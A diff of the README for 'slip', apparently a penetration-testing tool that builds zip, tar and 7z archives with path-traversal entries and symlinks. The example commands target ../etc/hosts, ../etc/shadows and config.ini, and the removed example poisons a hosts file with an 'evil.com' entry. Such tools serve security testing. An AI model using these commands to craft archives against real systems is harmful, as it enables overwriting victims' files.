@@ -74,17 +74,17 @@ Options:
 
 Create a tar.bz2 archive containing 2 explicit paths: 
 ```
-python3 slip.py --archive-type tar --compression bzip2 --paths "../etc/hosts, ../../etc/hosts" archive
+python3 slip.py --archive-type tar --compression bzip2 --paths "../etc/hosts, ../../etc/hosts" --file-content "foo" archive
 ```
 
 Create a zip archive containing an explicit path and an explicit symlink: 
 ```
-python3 slip.py --archive-type zip --compression deflate --paths "../etc/hosts" --symlinks "../etc/shadows" archive
+python3 slip.py --archive-type zip --compression deflate --paths "../etc/hosts" --symlinks "../etc/shadows" --file-content "foo" archive
 ```
 
 Create a tar.bz2 archive with 4 payloads to search for "config.ini" at 3 different depths (it also uses Windows flavor dot dot slash): 
 ```
-python3 slip.py --archive-type tar --compression bzip2 --paths "config.ini" --search 3 --dotdotslash "..\\" out
+python3 slip.py --archive-type tar --compression bzip2 --paths "config.ini" --search 3 --dotdotslash "..\\" archive
 ```
 The archive will contain:
 ```
@@ -92,11 +92,6 @@ config.ini
 ..\config.ini
 ..\..\config.ini
 ..\..\..\config.ini
-```
-
-Create a 7z archive with an explicit path and an explicit file content:
-```
-python3 slip.py --archive-type 7z --compression bzip2 --paths "../etc/hosts" --file-content "127.0.0.1    evil.com" archive
 ```
 
 Create a 7z archive with a named symlink:
@@ -109,7 +104,7 @@ Create a tar archive with multiple payloads (from the default mass-find dictiona
 ```
 python3 slip.py --archive-type tar --mass-find "/etc/hosts" --mass-find-mode symlinks archive
 ```
-⚠️ WARNING: mass-find mode supports paths, this translates to a bruteforce attempt to rewrite a specific file, but it uses A LOT of payloads, so the result is unpredictable. Use with caution.
+⚠️ WARNING: mass-find mode supports paths, this translates to a bruteforce attempt to rewrite a specific file, but it potentially uses A LOT of payloads, so the result is unpredictable. Use with caution.
 
 ## Notes
 - Depending on the library that handles the decompression, results may vary greatly.
@@ -117,8 +112,10 @@ python3 slip.py --archive-type tar --mass-find "/etc/hosts" --mass-find-mode sym
   Different compression algorithms can trigger different behaviours during the extraction, but also the usage of certain path traversal payloads in names or the co-presence of path traversal payloads in names and symlink can lead to weird behaviours during the extraction. Many combinations of compression algorithms, archive types and payloads are relatively untested and should be evaluated on a case by case basis to obtain the best results.
 
 - Archive types: jar|war|apk|ipa are supported as simple zip archives.  
-The archive format is correct, but valid files should contain compatible contents.
+The archive format is correct, but valid archives should contain compatible contents.
 Valid contents can be set manually and are not yet supported by slip.
+Please note that many software that handles these formats, treat them as zip files.
+This means that using the correct extension will suffice.
 
 ## License
 This project is licensed under the GPL-3.0 [License](https://github.com/0xless/slip/blob/main/LICENSE).
